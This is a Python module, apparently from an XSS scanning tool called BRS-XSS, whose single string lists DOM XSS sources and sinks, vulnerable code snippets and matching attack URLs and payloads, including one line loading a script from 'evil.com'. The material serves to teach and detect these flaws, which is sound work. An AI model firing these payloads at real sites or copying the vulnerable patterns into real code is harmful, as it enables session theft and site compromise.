#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

DOM-based XSS - Attack Vectors
"""

ATTACK_VECTOR = """
DOM XSS SOURCE-TO-SINK ANALYSIS:

SOURCES (User-Controllable Input):
1. location.hash         - URL fragment (#payload)
2. location.search       - Query string (?q=payload)
3. location.pathname     - URL path
4. location.href         - Full URL
5. document.referrer     - HTTP Referer
6. document.cookie       - Cookies (if HttpOnly not set)
7. localStorage          - Local storage
8. sessionStorage        - Session storage
9. postMessage           - Cross-origin messaging
10. Web Workers          - Worker messages
11. WebSocket            - WebSocket messages
12. IndexedDB            - Client-side database
13. window.name          - Window name property
14. document.URL         - Current URL

DANGEROUS SINKS (Code Execution Points):

HTML Rendering:
- element.innerHTML
- element.outerHTML
- element.insertAdjacentHTML()
- document.write()
- document.writeln()
- jQuery: $(selector).html(payload)
- jQuery: $(selector).append(payload)
- jQuery: $(selector).after(payload)

JavaScript Execution:
- eval(payload)
- setTimeout(payload, delay)  // String form
- setInterval(payload, delay) // String form
- Function(payload)
- execScript(payload)  // IE
- element.setAttribute('onclick', payload)
- element.setAttribute('onerror', payload)

URL-based:
- location = payload
- location.href = payload
- location.assign(payload)
- location.replace(payload)
- window.open(payload)
- element.src = payload  // iframe, script, img

ATTACK EXAMPLES:

1. LOCATION.HASH TO INNERHTML:
   Vulnerable code:
   const content = decodeURIComponent(location.hash.substring(1));
   document.getElementById('output').innerHTML = content;
   
   Attack URL:
   https://example.com/#<img src=x onerror=alert(document.cookie)>

2. LOCATION.SEARCH TO EVAL:
   Vulnerable code:
   const params = new URLSearchParams(location.search);
   const callback = params.get('callback');
   eval(callback + '(data)');
   
   Attack URL:
   https://example.com/?callback=alert

3. POSTMESSAGE TO INNERHTML:
   Vulnerable code:
   window.addEventListener('message', function(e) {
       document.body.innerHTML = e.data;
   });
   
   Attack:
   targetWindow.postMessage('<img src=x onerror=alert(1)>', '*');

4. LOCALSTORAGE TO SCRIPT SRC:
   Vulnerable code:
   const scriptUrl = localStorage.getItem('customScript');
   const script = document.createElement('script');
   script.src = scriptUrl;
   document.head.appendChild(script);
   
   Attack:
   localStorage.setItem('customScript', 'https://evil.com/xss.js');

5. DOCUMENT.REFERRER TO LOCATION:
   Vulnerable code:
   if (document.referrer) {
       location.href = document.referrer;
   }
   
   Attack:
   <a href="https://victim.com" referrerpolicy="unsafe-url">
   Set Referer to javascript:alert(1)

6. CLIENT-SIDE ROUTING (SPA):
   Vulnerable code:
   router.get('/page/:id', function(req) {
       document.getElementById('content').innerHTML = 
           '<h1>Page ' + req.params.id + '</h1>';
   });
   
   Attack URL:
   https://example.com/page/<img src=x onerror=alert(1)>

7. JQUERY HTML INJECTION:
   Vulnerable code:
   const searchQuery = location.search.substring(3);
   $('#results').html('You searched for: ' + searchQuery);
   
   Attack URL:
   https://example.com/?q=<img src=x onerror=alert(1)>

8. DOM CLOBBERING:
   Vulnerable code:
   <form id="config"></form>
   <script>
   if (config.isAdmin) {
       // Admin functionality
   }
   </script>
   
   Attack:
   <form id="config">
       <input name="isAdmin" value="true">
   </form>

9. PROTOTYPE POLLUTION TO DOM XSS:
   Step 1: Pollute prototype
   merge(obj, JSON.parse(userInput));
   // userInput: {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
   
   Step 2: Trigger XSS
   element[unknownProperty]; // Falls back to prototype.innerHTML

10. ANGULAR CLIENT-SIDE TEMPLATE INJECTION:
    Vulnerable code:
    <div>{{userInput}}</div>  (If template compilation enabled)
    
    Attack:
    {{constructor.constructor('alert(1)')()}}
    {{$on.constructor('alert(1)')()}}

FRAMEWORK-SPECIFIC ATTACKS:

React:
<div dangerouslySetInnerHTML={{__html: userInput}} />

Vue:
<div v-html="userInput"></div>

Angular:
<div [innerHTML]="userInput"></div>

Svelte:
{@html userInput}
"""

